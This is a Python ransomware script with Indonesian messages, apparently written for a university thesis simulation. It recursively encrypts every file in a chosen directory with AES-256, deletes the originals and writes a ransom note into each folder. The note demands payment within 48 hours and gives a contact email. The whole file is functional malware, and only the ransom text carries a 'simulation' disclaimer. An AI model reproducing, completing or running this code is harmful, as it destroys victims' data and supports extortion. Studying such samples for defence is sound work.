import os
import sys
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

def install_dependencies():
    try:
        import Crypto
    except ModuleNotFoundError:
        print("Modul 'pycryptodome' tidak ditemukan, menginstal sekarang...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        print("Instalasi selesai, silakan jalankan ulang skrip.")
        sys.exit()

install_dependencies()

def pad_data(data):
    pad_len = 16 - len(data) % 16
    return data + bytes([pad_len] * pad_len)

def unpad_data(data):
    pad_len = data[-1]
    return data[:-pad_len]

def scanRecurse(baseDir):
    for entry in os.scandir(baseDir):
        if entry.is_file():
            yield entry
        else:
            yield from scanRecurse(entry.path)

def encrypt_file(dataFile, key):
    dataFile = str(dataFile)
    extension = Path(dataFile).suffix.lower()

    try:
        with open(dataFile, 'rb') as f:
            data = f.read()

        padded_data = pad_data(data)
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        ciphertext = cipher.encrypt(padded_data)

        encryptedFile = dataFile + '.encrypt'
        with open(encryptedFile, 'wb') as f:
            f.write(iv + ciphertext)

        os.remove(dataFile)
    except Exception as e:
        print(f"Terjadi kesalahan saat mengenkripsi file {dataFile}: {e}")

def create_ransom_note(directory, ransom_message):
    ransom_file = os.path.join(directory, 'README_FOR_DECRYPT.txt')
    try:
        with open(ransom_file, 'w', encoding='utf-8') as f:
            f.write(ransom_message)
    except Exception as e:
        print(f"Terjadi kesalahan saat membuat catatan tebusan: {e}")

def main():
    os.system("cls")  # Bersihkan terminal Windows

    directory = input("Masukkan path direktori yang ingin dienkripsi: ")
    if not os.path.exists(directory) or not os.path.isdir(directory):
        print("Path tidak valid atau bukan direktori.")
        return

    excludeExtension = ['.py', '.encrypted', '.pem', '.exe', '.txt']

    ransom_message = """File Anda telah dienkripsi!\n\nUntuk memulihkan file Anda, Anda perlu membayar biaya dekripsi.\n\nCara memulihkan file Anda:\n1. Kirim email ke: pentesternegrisipil@gmail.com.\n2. Sertakan ID Anda: 123-456-ABCD-EFGH.\n3. Tunggu instruksi lebih lanjut.\n\nPERINGATAN!!\n1. Jangan mencoba mendekripsi file sendiri; itu bisa menyebabkan kehilangan data permanen.\n2. Pembayaran harus dilakukan dalam waktu 48 jam untuk menghindari biaya tambahan.\n\nNB: INI HANYA UNTUK SIMULASI TUGAS AKHIR(SKRIPSI) UNIVERSITAS AMIKOM PURWOKERTO"""

    key_file = 'encryption_key_256.bin'

    if not os.path.exists(key_file):
        key = get_random_bytes(32)
        with open(key_file, 'wb') as f:
            f.write(key.hex().encode('utf-8'))
    else:
        with open(key_file, 'rb') as f:
            key_hex = f.read().decode('utf-8')
            key = bytes.fromhex(key_hex)

    processed_directories = set()

    for item in scanRecurse(directory):
        filePath = Path(item)
        fileType = filePath.suffix.lower()

        if fileType in excludeExtension:
            continue

        encrypt_file(filePath, key)
        parent_directory = filePath.parent

        if parent_directory not in processed_directories:
            create_ransom_note(parent_directory, ransom_message)
            processed_directories.add(parent_directory)

if __name__ == "__main__":
    try:
        import Crypto
    except ModuleNotFoundError:
        print("Pycryptodome belum terinstal. Menginstal sekarang...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pycryptodome"])
        print("Instalasi selesai, jalankan ulang skrip.")
        sys.exit()
    main()
